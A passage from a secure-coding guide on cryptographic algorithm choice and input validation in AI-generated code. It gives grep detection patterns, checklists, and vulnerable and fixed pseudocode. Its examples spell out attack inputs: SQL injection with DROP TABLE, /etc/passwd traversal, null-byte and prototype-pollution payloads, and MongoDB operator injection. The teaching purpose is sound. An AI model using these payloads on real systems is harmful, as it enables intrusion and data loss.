| **scrypt** | 64+ MB | When Argon2 unavailable | Good alternative |

**Avoid:** MD5, SHA1, SHA256 (single round), PBKDF2 with <600k iterations

### Key Derivation

| Algorithm | Use Case | Notes |
|-----------|----------|-------|
| **Argon2id** | Password-based | Best for password → key |
| **HKDF** | Key expansion | Deriving multiple keys from one |
| **PBKDF2-SHA256** | Compatibility | 600k+ iterations required |

**Avoid:** MD5-based KDF, single-hash derivation, low iteration counts

### Message Authentication

| Algorithm | Output | Use Case | Notes |
|-----------|--------|----------|-------|
| **HMAC-SHA256** | 256 bits | General purpose | Standard choice |
| **HMAC-SHA512** | 512 bits | Extra security margin | Faster on 64-bit |
| **Poly1305** | 128 bits | With ChaCha20 | Part of AEAD |

**Avoid:** MD5, SHA1, plain hash without HMAC construction

### Digital Signatures

| Algorithm | Use Case | Notes |
|-----------|----------|-------|
| **Ed25519** | General purpose | Fast, secure, simple API |
| **ECDSA P-256** | Compatibility | Widely supported |
| **RSA-PSS** | Legacy systems | 2048+ bit key required |

**Avoid:** RSA PKCS#1 v1.5, DSA, ECDSA with weak curves

---

## Detection Hints: How to Spot Cryptographic Issues

### Code Review Patterns

```pseudocode
// RED FLAGS in cryptographic code:

// 1. Weak hash functions
md5(               // Search for: md5\s*\(
sha1(              // Search for: sha1\s*\(
SHA1.Create()      // Search for: SHA1

// 2. ECB mode
mode = "ECB"       // Search for: ECB
AES/ECB/           // Search for: /ECB/
mode_ECB           // Search for: ECB

// 3. Static or weak IVs
iv = [0, 0, 0, ...   // Search for: iv\s*=\s*\[0
IV = "0000           // Search for: IV\s*=\s*["']0
static IV            // Search for: static.*[Ii][Vv]

// 4. Math.random for security
Math.random()        // Search for: Math\.random
random.randint(      // Search for: randint\( (context matters)

// 5. Weak secrets
= "secret"           // Search for: =\s*["']secret
SECRET = "           // Search for: SECRET\s*=\s*["']
= "password"         // Search for: =\s*["']password

// 6. Direct password use as key
key = password       // Search for: key\s*=\s*password
AES(password)        // Search for: AES\s*\(\s*password

// 7. Low iteration counts
iterations: 1000     // Search for: iterations.*\d{1,4}[^0-9]
rounds = 100         // Search for: rounds\s*=\s*\d{1,3}[^0-9]

// GREP patterns for security review:
// [Mm][Dd]5\s*\(
// [Ss][Hh][Aa]1\s*\(
// ECB
// [Ii][Vv]\s*=\s*\[0
// Math\.random
// iterations.*[0-9]{1,4}[^0-9]
// (password|secret)\s*=\s*["']
```

### Security Testing Checklist

```pseudocode
// Cryptographic security test cases:

// 1. Algorithm verification
- [ ] No MD5 or SHA1 for password hashing
- [ ] No ECB mode encryption
- [ ] AES key size is 256 bits (not 128)
- [ ] Authenticated encryption used (GCM, ChaCha20-Poly1305)

// 2. Randomness verification
- [ ] IVs/nonces are cryptographically random
- [ ] Session tokens use CSPRNG
- [ ] No predictable seeds for random generation

// 3. Key management
- [ ] Keys not hardcoded in source
- [ ] Keys not logged or exposed in errors
- [ ] Key derivation uses appropriate KDF
- [ ] Key rotation mechanism exists

// 4. Password hashing
- [ ] bcrypt cost ≥ 12 or Argon2 with appropriate params
- [ ] Unique salt per password
- [ ] Timing-safe comparison used

// 5. Implementation details
- [ ] Constant-time comparison for secrets
- [ ] No padding oracle vulnerabilities
- [ ] HMAC used (not hash(key+message))
- [ ] Authenticated encryption or encrypt-then-MAC
```

---

## Security Checklist

- [ ] Password hashing uses Argon2id, bcrypt (cost 12+), or scrypt
- [ ] All passwords have unique, random salts (automatically handled by bcrypt/Argon2)
- [ ] No MD5, SHA1, or single-round SHA256 for security-sensitive hashing
- [ ] Encryption uses authenticated modes (AES-GCM, ChaCha20-Poly1305)
- [ ] No ECB mode encryption
- [ ] IVs/nonces generated with cryptographically secure random
- [ ] Each encryption operation uses unique IV/nonce
- [ ] GCM nonces tracked to prevent reuse (or use SIV modes)
- [ ] All random values for security use CSPRNG (crypto.randomBytes, secrets module)
- [ ] No Math.random() or similar PRNGs for security
- [ ] Encryption keys are 256 bits and properly random
- [ ] No hardcoded keys in source code
- [ ] Keys derived with HKDF, PBKDF2 (600k+ iterations), or Argon2
- [ ] Separate keys derived for different cryptographic operations
- [ ] Key rotation mechanism implemented
- [ ] Keys stored in KMS, HSM, or encrypted at rest
- [ ] Timing-safe comparison used for all secret comparisons
- [ ] HMAC used instead of hash(key+message)
- [ ] Error messages don't reveal cryptographic details (padding validity, etc.)
- [ ] No custom cryptographic algorithms—only standard, vetted primitives

---

# Pattern 6: Input Validation and Data Sanitization

**CWE References:** CWE-20 (Improper Input Validation), CWE-1286 (Improper Validation of Syntactic Correctness of Input), CWE-185 (Incorrect Regular Expression), CWE-1333 (Inefficient Regular Expression Complexity), CWE-129 (Improper Validation of Array Index)

**Priority Score:** 21 (Frequency: 9, Severity: 7, Detectability: 5)

---

## Introduction: The Foundation That AI Frequently Skips

Input validation is the **first line of defense** against virtually all injection attacks, data corruption, and application crashes. Yet AI-generated code consistently fails to implement proper validation, treating it as an afterthought or skipping it entirely.

**Why AI Models Skip or Fail at Input Validation:**

1. **Training Data Focuses on "Happy Path":** Most tutorial code, documentation examples, and Stack Overflow answers demonstrate functionality with expected inputs. Validation code is often omitted for brevity, teaching AI that it's optional.

2. **Validation Is Contextual:** Proper validation depends on business rules, data types, and downstream usage—context that AI often lacks. The model can't know that a "name" field shouldn't exceed 100 characters or that an "age" must be between 0 and 150.

3. **Client-Side Validation Appears Complete:** AI training data often contains client-side form validation (JavaScript). The model learns these patterns but fails to understand that server-side validation is the actual security boundary.

4. **Regex Complexity:** AI generates complex regex patterns that may be vulnerable to catastrophic backtracking (ReDoS) or miss edge cases. The model optimizes for matching expected patterns, not rejecting malicious ones.

5. **Trust Boundary Confusion:** AI doesn't inherently understand which data sources are trustworthy. It may validate user form input but trust data from internal APIs, databases, or message queues that could also be compromised.

6. **Type System Overconfidence:** In typed languages, AI may assume type declarations are sufficient validation, missing the need for range checks, format validation, and semantic constraints.

**Why This Matters - The Foundation of All Injection Attacks:**

Every major vulnerability class depends on inadequate input validation:
- **SQL Injection:** Unvalidated input in queries
- **Command Injection:** Unvalidated input in shell commands
- **XSS:** Unvalidated input rendered in HTML
- **Path Traversal:** Unvalidated file paths
- **Deserialization Attacks:** Unvalidated serialized objects
- **Buffer Overflows:** Unvalidated input lengths
- **Business Logic Bypass:** Unvalidated business constraints

**Impact Statistics:**
- CWE-20 (Improper Input Validation) appears in OWASP Top 10 as a root cause of multiple vulnerabilities
- 42% of SQL injection vulnerabilities trace back to missing input validation (NIST NVD analysis)
- ReDoS vulnerabilities increased 143% year-over-year in npm packages (Snyk 2024)
- 67% of AI-generated validation code only validates on the client side (Security research 2025)

---

## BAD Examples: Different Manifestations

### BAD Example 1: Client-Side Only Validation

```pseudocode
// VULNERABLE: All validation in frontend, server trusts everything

// Frontend validation (JavaScript)
function validateForm(form):
    if form.email is empty:
        showError("Email required")
        return false

    if not isValidEmail(form.email):
        showError("Invalid email format")
        return false

    if form.password.length < 8:
        showError("Password must be 8+ characters")
        return false

    if form.age < 0 or form.age > 150:
        showError("Invalid age")
        return false

    // Form is "valid", submit to server
    return true

// Backend endpoint (VULNERABLE - no validation)
function handleRegistration(request):
    // AI assumes frontend validated, so just use the data
    email = request.body.email      // Could be anything
    password = request.body.password // Could be empty
    age = request.body.age          // Could be -1 or 9999999

    // Directly store in database
    query = "INSERT INTO users (email, password, age) VALUES (?, ?, ?)"
    database.execute(query, [email, hashPassword(password), age])

    return {"success": true}
```

**Why This Is Dangerous:**
- Attackers bypass JavaScript by sending direct HTTP requests (curl, Postman, scripts)
- Browser dev tools allow modifying form data before submission
- Server receives arbitrary data with no protection
- Data integrity issues cascade through the application
- SQL injection still possible if query construction is vulnerable elsewhere

**Attack Scenario:**
```pseudocode
// Attacker sends directly to API:
POST /api/register
Content-Type: application/json

{
    "email": "'; DROP TABLE users; --",
    "password": "",
    "age": -9999999999
}
```

---

### BAD Example 2: Partial Validation (Type but Not Range)

```pseudocode
// VULNERABLE: Validates type exists, ignores business constraints

function processPayment(request):
    // Type checking only
    if typeof(request.amount) != "number":
        return error("Amount must be a number")

    if typeof(request.quantity) != "integer":
        return error("Quantity must be an integer")

    // MISSING: Range validation
    // amount could be negative (refund attack)
    // quantity could be 0 or MAX_INT (business logic bypass)

    total = request.amount * request.quantity
    chargeCustomer(request.customerId, total)

    return {"charged": total}

// Attacker exploits:
{
    "amount": -100.00,      // Negative = credit instead of charge
    "quantity": 999999999,  // Integer overflow potential
    "customerId": "12345"
}
```

**Why This Is Dangerous:**
- Type validation is necessary but not sufficient
- Business logic depends on reasonable ranges
- Integer overflow can wrap to unexpected values
- Negative values can invert expected behavior
- Zero values can bypass payment or cause division errors

---

### BAD Example 3: Regex Without Anchors

```pseudocode
// VULNERABLE: Regex matches substring, not entire input

// Email validation without anchors
EMAIL_PATTERN = "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"

function validateEmail(email):
    if regex.match(EMAIL_PATTERN, email):
        return true
    return false

// This PASSES validation:
validateEmail("MALICIOUS_PAYLOAD user@example.com MALICIOUS_PAYLOAD")
// Because "user@example.com" matches somewhere in the string

// Filename validation without anchors
SAFE_FILENAME = "[a-zA-Z0-9_-]+"

function validateFilename(filename):
    if regex.match(SAFE_FILENAME, filename):
        return true
    return false

// This PASSES validation:
validateFilename("../../../etc/passwd")
// Because "etc" matches the pattern somewhere in the string
```

**Why This Is Dangerous:**
- Regex matches anywhere in string, not the complete input
- Injection payloads can surround or precede valid patterns
- Path traversal bypasses filename validation
- Email field can contain XSS payloads around valid address
- Common in AI-generated code which copies regex patterns without anchors

**Fix Preview:**
```pseudocode
// SECURE: Use ^ and $ anchors to match entire input
EMAIL_PATTERN = "^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$"
SAFE_FILENAME = "^[a-zA-Z0-9_-]+$"
```

---

### BAD Example 4: ReDoS-Vulnerable Patterns

```pseudocode
// VULNERABLE: Catastrophic backtracking regex patterns

// Email validation with ReDoS vulnerability
// Pattern: nested quantifiers with overlapping character classes
VULNERABLE_EMAIL = "^([a-zA-Z0-9]+)*@[a-zA-Z0-9]+\.[a-zA-Z]+$"

// Attack input: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
// The regex engine backtracks exponentially trying all combinations

// URL validation with ReDoS
VULNERABLE_URL = "^(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]{2,6})([\/\w \.-]*)*\/?$"

// Attack input: long string of valid URL characters followed by invalid character
// "http://example.com/" + "a" * 30 + "!"

// Naive duplicate word finder (common tutorial example)
DUPLICATE_WORDS = "\b(\w+)\s+\1\b"
// Can hang on: "word word word word word word word word word word!"

function validateInput(input, pattern):
    // This can hang for minutes or crash the server
    return regex.match(pattern, input)
```

**Why This Is Dangerous:**
- Single malicious request can consume 100% CPU for minutes
- Denial of Service without requiring many requests
- AI copies these patterns from tutorials without understanding complexity
- Nested quantifiers `(a+)+`, `(a*)*`, `(a?)*` are red flags
- Overlapping character classes compound the problem

**ReDoS Complexity Analysis:**
```pseudocode
// Pattern: (a+)+$
// Input: "aaaaaaaaaaaaaaaaaaaaaaaaX"
//
// For 25 'a's followed by 'X':
// - The engine tries every possible way to split the 'a's between groups
// - Time complexity: O(2^n) where n is input length
// - 25 chars = 33 million+ combinations to try
// - 30 chars = 1 billion+ combinations
```

---

### BAD Example 5: Missing Null/Undefined Checks

```pseudocode
// VULNERABLE: Assumes data structure completeness

function processUserProfile(user):
    // No null checks - any missing field crashes
    fullName = user.firstName + " " + user.lastName  // Crash if null

    emailDomain = user.email.split("@")[1]  // Crash if email is null

    age = parseInt(user.profile.age)  // Crash if profile is null

    // Process address (deeply nested)
    city = user.profile.address.city.toUpperCase()  // Multiple crash points

    return {
        "name": fullName,
        "domain": emailDomain,
        "age": age,
        "city": city
    }

// API returns partial data:
{
    "firstName": "John",
    "lastName": null,           // Could be null
    "email": null,              // Could be missing
    "profile": {
        "age": "25"
        // address is missing entirely
    }
}
```

**Why This Is Dangerous:**
- Application crashes reveal error messages to attackers
- Null pointer exceptions can leak stack traces
- Partial data from APIs, databases, or user input is common
- AI assumes training data structures are always complete
- Cascading failures when one field is null

---

### BAD Example 6: Trusting Array Indices from User Input

```pseudocode
// VULNERABLE: Using user input directly as array index

function getItemByIndex(request):
    items = ["item0", "item1", "item2", "item3", "item4"]
    index = request.params.index  // User-provided

    // No validation - trusts user to provide valid index
    return items[index]  // Out of bounds or negative index

// Worse: Array index used for data access
function getUserData(request):
    userIndex = parseInt(request.params.id)

    // Could access negative index, other users' data, or crash
    return allUsersData[userIndex]

// Object property access from user input
function getConfigValue(request):
    configKey = request.params.key

    // Prototype pollution or access to __proto__, constructor
    return config[configKey]
```

**Why This Is Dangerous:**
- Negative indices wrap to end of array in some languages
- Out-of-bounds access crashes or returns undefined behavior
- Integer overflow can produce unexpected indices
- Object property access allows prototype pollution
- `__proto__`, `constructor`, `prototype` keys can modify object behavior

**Attack Scenarios:**
```pseudocode
// Array out of bounds:
GET /items?index=99999999
GET /items?index=-1

// Prototype pollution via property access:
GET /config?key=__proto__
GET /config?key=constructor
POST /config {"key": "__proto__", "value": {"isAdmin": true}}
```

---

## GOOD Examples: Proper Patterns

### GOOD Example 1: Server-Side Validation Patterns

```pseudocode
// SECURE: Comprehensive server-side validation with clear error messages

function handleRegistration(request):
    errors = []

    // Email validation
    email = request.body.email
    if email is null or email is empty:
        errors.append({"field": "email", "message": "Email is required"})
    else if length(email) > 254:  // RFC 5321 limit
        errors.append({"field": "email", "message": "Email too long"})
    else if not isValidEmailFormat(email):
        errors.append({"field": "email", "message": "Invalid email format"})
    else if not isAllowedEmailDomain(email):  // Business rule
        errors.append({"field": "email", "message": "Email domain not allowed"})

    // Password validation
    password = request.body.password
    if password is null or password is empty:
        errors.append({"field": "password", "message": "Password is required"})
    else if length(password) < 12:
        errors.append({"field": "password", "message": "Password must be 12+ characters"})
    else if length(password) > 128:  // Prevent DoS via bcrypt
        errors.append({"field": "password", "message": "Password too long"})
    else if not meetsComplexityRequirements(password):
        errors.append({"field": "password", "message": "Password too weak"})

    // Age validation (integer with business range)
    age = request.body.age
    if age is null:
        errors.append({"field": "age", "message": "Age is required"})
    else if typeof(age) != "integer":
        errors.append({"field": "age", "message": "Age must be a whole number"})
    else if age < 13:  // Business rule: minimum age
        errors.append({"field": "age", "message": "Must be at least 13 years old"})
    else if age > 150:  // Sanity check
        errors.append({"field": "age", "message": "Invalid age"})

    // Return all errors at once (better UX than one at a time)
    if errors.length > 0:
        return {"success": false, "errors": errors}

    // Only process after validation passes
    hashedPassword = hashPassword(password)
    createUser(email, hashedPassword, age)
    return {"success": true}
```

**Why This Is Secure:**
- Every field validated before use
- Type, format, length, and business rules all checked
- Clear, specific error messages for debugging
- All errors collected (better user experience)
- Reasonable upper bounds prevent DoS
- Validation happens server-side where client cannot bypass

---

### GOOD Example 2: Schema Validation Approaches

```pseudocode
// SECURE: Declarative schema validation with robust library

// Define schema once, reuse everywhere
USER_REGISTRATION_SCHEMA = {
    "type": "object",
    "required": ["email", "password", "age", "name"],
    "additionalProperties": false,  // Reject unknown fields
    "properties": {
        "email": {
            "type": "string",
            "format": "email",
            "maxLength": 254
        },
        "password": {
            "type": "string",
            "minLength": 12,
            "maxLength": 128
        },
        "age": {
            "type": "integer",
            "minimum": 13,
            "maximum": 150
        },
        "name": {
            "type": "object",
            "required": ["first", "last"],
            "properties": {
                "first": {
                    "type": "string",
                    "minLength": 1,
                    "maxLength": 100,
                    "pattern": "^[\\p{L}\\s'-]+$"  // Unicode letters, spaces, hyphens, apostrophes
                },
                "last": {
                    "type": "string",
                    "minLength": 1,
                    "maxLength": 100,
                    "pattern": "^[\\p{L}\\s'-]+$"
                }
            }
        }
    }
}

function handleRegistration(request):
    // Validate entire payload against schema
    validationResult = schemaValidator.validate(request.body, USER_REGISTRATION_SCHEMA)

    if not validationResult.valid:
        return {
            "success": false,
            "errors": validationResult.errors  // Detailed error per field
        }

    // Data is guaranteed to match schema structure and constraints
    processRegistration(request.body)
    return {"success": true}

// Additional business logic validation after schema validation
function processRegistration(data):
    // Schema ensures structure; now check business rules
    if isEmailAlreadyRegistered(data.email):
        throw ValidationError("Email already registered")

    if isCommonPassword(data.password):
        throw ValidationError("Password is too common")

    createUser(data)
```

**Why This Is Secure:**
- Schema is declarative, easy to audit
- `additionalProperties: false` prevents unexpected data injection
- Type coercion handled consistently by library
- Unicode-aware patterns for international names
- Nested object validation built-in
- Separation of structural validation and business rules

---

### GOOD Example 3: Safe Regex Patterns

```pseudocode
// SECURE: Anchored, bounded, and ReDoS-resistant patterns

// Email validation - anchored and bounded
// Note: Perfect email validation is complex; often better to just check format
// and verify via confirmation email
EMAIL_PATTERN = "^[a-zA-Z0-9._%+-]{1,64}@[a-zA-Z0-9.-]{1,253}\\.[a-zA-Z]{2,63}$"

// Safe filename - anchored, limited character set, bounded length
FILENAME_PATTERN = "^[a-zA-Z0-9][a-zA-Z0-9._-]{0,254}$"

// Safe identifier (alphanumeric + underscore, starts with letter)
IDENTIFIER_PATTERN = "^[a-zA-Z][a-zA-Z0-9_]{0,63}$"

// URL path segment - no special characters
PATH_SEGMENT_PATTERN = "^[a-zA-Z0-9._-]{1,255}$"

function validateWithSafeRegex(input, pattern, maxLength):
    // Length check BEFORE regex (prevents ReDoS)
    if input is null or length(input) > maxLength:
        return false

    // Use timeout-protected regex matching if available
    try:
        return regexMatchWithTimeout(pattern, input, timeout = 100ms)
    catch TimeoutException:
        logWarning("Regex timeout on input: " + truncate(input, 50))
        return false

// For complex patterns, use atomic groups or possessive quantifiers
// (syntax varies by regex engine)

// VULNERABLE: (a+)+
// SAFE: (?>a+)+ (atomic group - no backtracking into group)
// SAFE: a++ (possessive quantifier - never backtracks)

// Alternative: Linear-time regex engines (RE2, rust regex)
// These reject patterns that could have exponential complexity
function validateWithLinearRegex(input, pattern):
    // RE2 guarantees O(n) matching time
    return RE2.match(pattern, input)
```

**Why This Is Secure:**
- All patterns anchored with `^` and `$`
- Length bounded to prevent long input attacks
- Character classes don't overlap (no `[a-zA-Z0-9]+` next to `[a-z]+`)
- No nested quantifiers that could cause backtracking
- Timeout protection as defense in depth
- Option to use linear-time regex engines

---

### GOOD Example 4: Type Coercion Handling

```pseudocode
// SECURE: Explicit type handling with safe coercion

function parseIntegerSafe(value, min, max):
    // Handle null/undefined
    if value is null or value is undefined:
        return {valid: false, error: "Value is required"}

    // If already integer, validate range
    if typeof(value) == "integer":
        if value < min or value > max:
            return {valid: false, error: "Value out of range: " + min + "-" + max}
        return {valid: true, value: value}

    // If string, parse carefully
    if typeof(value) == "string":
        // Check for valid integer string (no floats, no hex, no scientific)
        if not regex.match("^-?[0-9]+$", value):
            return {valid: false, error: "Invalid integer format"}

        parsed = parseInt(value, 10)  // Always specify radix

        // Check for NaN (parsing failure)
        if isNaN(parsed):
            return {valid: false, error: "Could not parse integer"}

        // Check for overflow
        if parsed < MIN_SAFE_INTEGER or parsed > MAX_SAFE_INTEGER:
            return {valid: false, error: "Integer overflow"}

        // Range check
        if parsed < min or parsed > max:
            return {valid: false, error: "Value out of range: " + min + "-" + max}

        return {valid: true, value: parsed}

    // Reject all other types
    return {valid: false, error: "Expected integer, got " + typeof(value)}

// Usage
function handlePayment(request):
    amountResult = parseIntegerSafe(request.body.amount, 1, 1000000)  // 1 cent to $10,000
    if not amountResult.valid:
        return error("amount: " + amountResult.error)

    quantityResult = parseIntegerSafe(request.body.quantity, 1, 100)
    if not quantityResult.valid:
        return error("quantity: " + quantityResult.error)

    // Safe to use validated integers
    total = amountResult.value * quantityResult.value
    processPayment(total)
```

**Why This Is Secure:**
- Explicit handling of null/undefined
- Type checking before operations
- Safe string-to-integer parsing with radix
- Overflow checking for platform limits
- Range validation for business constraints
- Clear error messages for each failure mode

---

### GOOD Example 5: Whitelist Validation

```pseudocode
// SECURE: Allowlist approach - only accept known-good values

// For enum-like fields, use explicit allowlist
ALLOWED_COUNTRIES = ["US", "CA", "GB", "DE", "FR", "JP", "AU"]
ALLOWED_ROLES = ["user", "moderator", "admin"]
ALLOWED_SORT_FIELDS = ["name", "date", "price", "rating"]
ALLOWED_FILE_EXTENSIONS = [".jpg", ".jpeg", ".png", ".gif", ".pdf"]

function validateCountry(input):
    // Case-insensitive comparison against allowlist
    normalized = input.toUpperCase().trim()
    if normalized in ALLOWED_COUNTRIES:
        return {valid: true, value: normalized}
    return {valid: false, error: "Invalid country code"}

function validateSortField(input):
    // Exact match required
    if input in ALLOWED_SORT_FIELDS:
        return {valid: true, value: input}
    return {valid: false, error: "Invalid sort field"}

function validateFileUpload(filename, content):
    // Extension whitelist
    extension = getExtension(filename).toLowerCase()
    if extension not in ALLOWED_FILE_EXTENSIONS:
        return {valid: false, error: "File type not allowed"}

    // ALSO validate content type (magic bytes)
    detectedType = detectFileType(content)
    if detectedType.extension != extension:
        return {valid: false, error: "File content doesn't match extension"}

    // Additional: check file isn't actually executable or contains script
    if containsExecutableContent(content):
        return {valid: false, error: "File contains disallowed content"}

    return {valid: true}

// For SQL column/table names (cannot be parameterized)
function validateColumnName(input, allowedColumns):
    if input in allowedColumns:
        return input  // Safe to use in query
    throw ValidationError("Invalid column name")

// Usage in query
function searchProducts(filters):
    sortField = validateColumnName(filters.sortBy, ["name", "price", "created_at"])
    sortOrder = filters.order == "desc" ? "DESC" : "ASC"  // Binary choice

    // Now safe to interpolate (they're from allowlist)
    query = "SELECT * FROM products ORDER BY " + sortField + " " + sortOrder
    return database.query(query)
```

**Why This Is Secure:**
- Only pre-approved values accepted
- No regex complexity or bypass potential
- Clear, auditable list of allowed values
- Easy to update when requirements change
- File validation checks both extension AND content
- SQL identifiers validated against explicit list

---

### GOOD Example 6: Canonicalization Before Validation

```pseudocode
// SECURE: Normalize input before validation to prevent bypass

function validatePath(input):
    // Step 1: Reject null bytes (used to bypass filters)
    if contains(input, "\x00"):
        return {valid: false, error: "Invalid character in path"}

    // Step 2: Decode URL encoding (multiple rounds to catch double-encoding)
    decoded = input
    for i in range(3):  // Max 3 rounds of decoding
        newDecoded = urlDecode(decoded)
        if newDecoded == decoded:
            break  // No more encoding to decode
        decoded = newDecoded

    // Step 3: Normalize path separators
    normalized = decoded.replace("\\", "/")

    // Step 4: Resolve path (remove . and ..)
    resolved = resolvePath(normalized)

    // Step 5: Check against allowed base directory
    allowedBase = "/var/www/uploads/"
    if not resolved.startsWith(allowedBase):
        return {valid: false, error: "Path traversal detected"}

    // Step 6: Check for remaining dangerous patterns
    if contains(resolved, ".."):
        return {valid: false, error: "Invalid path component"}

    return {valid: true, value: resolved}

function validateUsername(input):
    // Normalize Unicode before validation
    // NFC = Canonical Composition (combines characters)
    normalized = unicodeNormalize(input, "NFC")

    // Check for confusable characters (homoglyphs)
    if containsHomoglyphs(normalized):
        return {valid: false, error: "Username contains confusable characters"}

    // Now validate the normalized form
    if not regex.match("^[a-zA-Z0-9_]{3,20}$", normalized):
        return {valid: false, error: "Invalid username format"}

    return {valid: true, value: normalized}

function validateUrl(input):
    // Parse URL to get components
    parsed = parseUrl(input)

    if parsed is null:
        return {valid: false, error: "Invalid URL"}

    // Validate scheme (allowlist)
    if parsed.scheme not in ["http", "https"]:
        return {valid: false, error: "Only HTTP(S) URLs allowed"}

    // Check for IP addresses (may be SSRF target)
    if isIpAddress(parsed.host):
        return {valid: false, error: "IP addresses not allowed"}

    // Check for internal hostnames
    if parsed.host.endsWith(".internal") or parsed.host == "localhost":
        return {valid: false, error: "Internal URLs not allowed"}

    // Check for credentials in URL
    if parsed.username or parsed.password:
        return {valid: false, error: "Credentials in URL not allowed"}

    // Reconstruct URL from parsed components (normalizes encoding)
    canonicalUrl = buildUrl(parsed.scheme, parsed.host, parsed.port, parsed.path)

    return {valid: true, value: canonicalUrl}
```

**Why This Is Secure:**
- Multiple encoding layers decoded before validation
- Path normalization prevents traversal with `/./` or `/../`
- Unicode normalization prevents homoglyph attacks
- URL parsing validates structure before checking content
- Allowlist for URL schemes prevents `file://`, `javascript:` etc.
- SSRF protection by rejecting internal hostnames and IPs

---

## Edge Cases Section

### Edge Case 1: Unicode Normalization Issues

```pseudocode
// DANGEROUS: Validating before normalization allows bypass

// Attack: Using decomposed Unicode characters
// "admin" can be represented as:
// - "admin" (5 ASCII characters)
// - "admin" with combining characters: "admin" + accent marks
// - Confusables: "αdmin" (Greek alpha), "аdmin" (Cyrillic a)

function vulnerableUsernameCheck(input):
    if input == "admin":
        return "Cannot register as admin"
    return "OK"

// Attacker uses: "аdmin" (Cyrillic 'а' looks like Latin 'a')
vulnerableUsernameCheck("аdmin")  // Returns "OK"
// But displays as "admin" in UI!

// SECURE: Normalize and check for confusables
function secureUsernameCheck(input):
    // Step 1: Unicode normalize to NFC
    normalized = unicodeNormalize(input, "NFC")

    // Step 2: Convert confusables to ASCII equivalent
    ascii = convertConfusablesToAscii(normalized)

    // Step 3: Check reserved names against ASCII version
    reservedNames = ["admin", "root", "system", "administrator", "support"]
    if ascii.toLowerCase() in reservedNames:
        return {valid: false, error: "Reserved username"}

    // Step 4: Only allow safe character set
    if not isAsciiAlphanumeric(input):
        return {valid: false, error: "Username must be ASCII letters and numbers"}

    return {valid: true, value: normalized}
```

**Detection:** Test with Unicode confusables for admin/root, combining characters, zero-width characters.

---

### Edge Case 2: Null Byte Injection

```pseudocode
// DANGEROUS: Null bytes can truncate strings in some languages

// Filename validation bypass with null byte
filename = "malicious.php\x00.jpg"

// In C/PHP, strcmp might only see "malicious.php\x00"
// The ".jpg" is ignored
if filename.endsWith(".jpg"):
    uploadFile(filename)  // Allows .php upload!

// Path validation bypass
path = "/safe/directory/../../etc/passwd\x00/safe/suffix"
// Validation sees: ends with "/safe/suffix" - looks OK
// File system sees: "/etc/passwd"

// SECURE: Strip null bytes first
function sanitizeInput(input):
    // Remove null bytes entirely
    sanitized = input.replace("\x00", "")

    // Also remove other control characters
    sanitized = removeControlCharacters(sanitized)

    return sanitized

function validateFilename(input):
    sanitized = sanitizeInput(input)

    // Now validate
    if sanitized != input:
        return {valid: false, error: "Invalid characters in filename"}

    // Continue with extension validation
    // ...
```

**Detection:** Test all string inputs with embedded null bytes (`\x00`, `%00`).

---

### Edge Case 3: Type Confusion

```pseudocode
// DANGEROUS: Loose type comparison leads to bypass

// JavaScript/PHP style loose comparison
function vulnerableAuth(password):
    storedHash = "0e123456789"  // Some MD5 hashes start with "0e"
    inputHash = md5(password)

    // In PHP: "0e123456789" == "0e987654321" is TRUE!
    // Both are interpreted as 0 * 10^(number) = 0
    if inputHash == storedHash:  // Loose comparison
        return "Authenticated"
    return "Failed"

// Type confusion with arrays
function vulnerablePasswordReset(token):
    // Expected: token = "abc123def456"
    // Attack: token = {"$gt": ""}  (MongoDB injection via type confusion)

    if database.findOne({"resetToken": token}):
        return "Token found"

// SECURE: Strict type checking
function secureAuth(password):
    storedHash = getStoredHash(user)
    inputHash = hashPassword(password)

    // Strict comparison and constant-time
    if typeof(inputHash) != "string" or typeof(storedHash) != "string":
        return "Failed"

    if not constantTimeEquals(inputHash, storedHash):
        return "Failed"

    return "Authenticated"

function securePasswordReset(token):
    // Enforce string type
    if typeof(token) != "string":
        return {valid: false, error: "Invalid token format"}

    // Validate format
    if not regex.match("^[a-f0-9]{64}$", token):
        return {valid: false, error: "Invalid token format"}

    // Now safe to query
    result = database.findOne({"resetToken": token})
    // ...
```

**Detection:** Test with different types: arrays, objects, numbers, booleans where strings expected.

---

### Edge Case 4: Integer Overflow in Validation

```pseudocode
// DANGEROUS: Validation passes but computation overflows

function vulnerablePurchase(quantity, price):
    // Validate ranges
    if quantity < 0 or quantity > 1000000:
        return error("Invalid quantity")
    if price < 0 or price > 1000000:
        return error("Invalid price")

    // Both pass validation, but multiplication overflows!
    // quantity = 999999, price = 999999
    // total = 999998000001 (exceeds 32-bit integer)
    total = quantity * price  // OVERFLOW

    chargeCustomer(total)  // May wrap to negative or small number

// SECURE: Check for overflow in computation
function securePurchase(quantity, price):
    // Validate individual ranges
    if not isValidInteger(quantity, 1, 1000):
        return error("Invalid quantity")
    if not isValidInteger(price, 1, 10000000):  // in cents
        return error("Invalid price")

    // Check multiplication won't overflow
    MAX_SAFE_TOTAL = 2147483647  // 32-bit signed max

    if quantity > MAX_SAFE_TOTAL / price:
        return error("Order total too large")

    total = quantity * price  // Now safe

    // Additional business validation
    if total > MAX_ALLOWED_TRANSACTION:
        return error("Transaction exceeds limit")

    chargeCustomer(total)

// Alternative: Use arbitrary precision arithmetic for money
function securePurchaseWithDecimal(quantity, price):
    quantityDecimal = Decimal(quantity)
    priceDecimal = Decimal(price)

    total = quantityDecimal * priceDecimal  // No overflow

    if total > Decimal(MAX_ALLOWED_TRANSACTION):
        return error("Transaction exceeds limit")

    chargeCustomer(total)
```

**Detection:** Test with MAX_INT, MAX_INT-1, boundary values, and combinations that multiply to overflow.

---

## Common Mistakes Section

### Common Mistake 1: Validating Formatted Output Instead of Input

```pseudocode
// WRONG: Validate after formatting
function displayUserData(userId):
    userData = database.getUser(userId)  // Raw from DB

    // Format for display
    formattedName = formatName(userData.name)
    formattedBio = formatBio(userData.bio)

    // Validating AFTER format - too late!
    if containsHtml(formattedName):  // Already formatted/escaped
        return error("Invalid name")

    return template.render(formattedName, formattedBio)

// CORRECT: Validate at input, encode at output
function saveUserData(request):
    name = request.body.name
    bio = request.body.bio

    // Validate raw input BEFORE storing
    if not isValidName(name):
        return error("Invalid name")

    if containsDangerousPatterns(bio):
        return error("Invalid bio content")

    // Store validated (but not encoded) data
    database.saveUser({"name": name, "bio": bio})

function displayUserData(userId):
    userData = database.getUser(userId)

    // Encode for output context (don't validate again)
    return template.render({
        "name": htmlEncode(userData.name),
